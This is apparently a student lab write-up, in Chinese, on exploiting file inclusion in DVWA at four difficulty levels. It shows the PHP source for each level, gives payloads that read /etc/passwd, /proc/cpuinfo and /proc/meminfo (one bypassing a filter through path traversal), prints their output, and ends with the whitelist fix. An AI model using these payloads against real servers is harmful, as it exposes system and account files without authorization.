# Ex4

文件包含

## Low等级本地文件包含和远程文件包含（20分）

* 以下为页面源代码

```php
// The page we wish to display
$file = $_GET[ 'page' ];
```

由源代码分析可知，Low等级没有做任何防护，可以将page参数作为文件路径进行加载。

将用户列表路径```/etc/passwd```作为参数传入，便可得到以下结果。

```log
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...以下省略若干行...
```

## Medium等级本地文件包含和远程文件包含（20分）

* 以下为页面源代码

```php
// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );
```

由源代码分析可知，Medium等级使用了黑名单方式防护，拒绝了http、https协议，以及上级路径的加载。

但是显然并没有对绝对路径进行处理，所以构造参数```/proc/cpuinfo```，便可以获取CPU信息。

```log
processor	: 0
BogoMIPS	: 48.00
Features	: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma lrcpc dcpop sha3 asimddp sha512 asimdfhm dit uscat ilrcpc flagm ssbs sb paca pacg dcpodp flagm2 frint
CPU implementer	: 0x41
CPU architecture: 8
CPU variant	: 0x0
CPU part	: 0x000
CPU revision	: 0

processor	: 1
BogoMIPS	: 48.00
Features	: fp asimd evtstrm aes pmull sha1 sha2 crc32 atomics fphp asimdhp cpuid asimdrdm jscvt fcma lrcpc dcpop sha3 asimddp sha512 asimdfhm dit uscat ilrcpc flagm ssbs sb paca pacg dcpodp flagm2 frint
CPU implementer	: 0x41
CPU architecture: 8
CPU variant	: 0x0
CPU part	: 0x000
CPU revision	: 0
```

## High级别本地文件包含和远程文件包含（20分）

* 以下为页面源代码

```php
// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
```

由源代码分析可知，High等级对参数路径进行了file开头的匹配，并且文件名不能为include.php。

但是显然，对于上级路径的解析并没有做好防护，那么构造参数```file/../../../../../../proc/meminfo```，便可以得到系统内存信息。

```log
MemTotal:        2028684 kB
MemFree:          135356 kB
MemAvailable:     713516 kB
Buffers:          134748 kB
Cached:           595964 kB
SwapCached:        40428 kB
Active:           846796 kB
Inactive:         714260 kB
...以下省略若干行...
```

## Impossible等级的机制以及修复、防御文件包含的方法（30分）

* 以下为页面源代码

```php
// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
```

由源代码分析可知，Impossible采用了白名单机制，显然除了以上4个页面外，无法加载其它页面。
